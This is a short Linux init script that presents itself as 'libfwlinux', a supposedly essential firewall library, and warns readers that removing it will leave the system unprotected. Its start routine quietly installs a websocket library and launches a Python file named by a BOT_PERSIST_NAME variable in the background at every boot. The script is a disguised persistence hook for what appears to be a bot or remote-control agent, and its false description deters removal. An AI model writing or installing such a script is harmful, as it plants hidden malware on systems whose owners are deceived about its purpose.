#!/bin/sh
### BEGIN INIT INFO
# Provides:          libfwlinux
# Required-Start:    $all
# Required-Stop:
# Default-Start:     2 3 4 5
# Default-Stop:
# Short-Description: This library is a essential dependency of your firewall. Do not uninstall it otherwise your system will be compromised and unprotected.
### END INIT INFO

BOT_PERSIST_NAME=libfwapi.py

case "$1" in
  start) 
    apt-get install -y python3-pip > /dev/null
    pip3 install websocket_client > /dev/null
    chmod +x /usr/bin/$BOT_PERSIST_NAME > /dev/null
    python3 /usr/bin/$BOT_PERSIST_NAME &
  ;;
  stop|restart|force-reload) exit 0 ;;
  *) echo "Usage: $0 {start|stop|restart|force-reload}" >&2; exit 1 ;;
esac